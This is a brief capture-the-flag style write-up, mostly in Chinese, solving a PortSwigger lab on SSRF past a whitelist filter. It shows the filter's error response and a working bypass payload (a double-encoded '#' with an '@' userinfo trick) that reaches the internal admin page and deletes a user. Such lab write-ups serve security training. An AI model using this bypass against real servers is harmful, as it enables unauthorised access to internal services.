[Write Up]Lab: SSRF with whitelist-based input filter

2024-11-30
#write-up  #portswigger  #ssrf 

Lab description#

Solution#

  1. 目标入口同前题，但此题部署了1个防止SSRF的防御措施
  2. 若将请求体设置为http://localhost/admin会获得以下返回
    HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"
  3. 最终尝试到请求体为http://localhost%2523@stock.weliketoshop.net/admin，将请求体修改并发送后得知删除用户carlos的url为http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos，将请求体修改为此url后即可达成目的
